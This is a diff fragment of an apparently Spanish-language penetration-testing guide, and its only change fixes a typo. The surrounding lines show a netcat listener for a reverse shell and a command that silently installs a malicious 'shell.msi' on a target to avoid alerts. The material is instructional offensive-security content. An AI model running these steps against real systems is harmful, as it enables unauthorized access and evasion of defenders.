@@ -1383,7 +1383,7 @@ rlwrap nc -lnvp 4444
 
 ###### 4. Ejecutar el Paquete MSI en el Objetivo
 
-En la máquina objetivo, ejecutamos el paquete MSI utilizanod el comando `msiexec`. Para evitar alertas o interrupciones, usamos los parámetros `/quiet` y `/qn`, que ejecutan la instalación en modo silencioso:
+En la máquina objetivo, ejecutamos el paquete MSI utilizando el comando `msiexec`. Para evitar alertas o interrupciones, usamos los parámetros `/quiet` y `/qn`, que ejecutan la instalación en modo silencioso:
 
 ```powershell
 msiexec /i C:\temp\shell.msi /quiet /qn /norestart
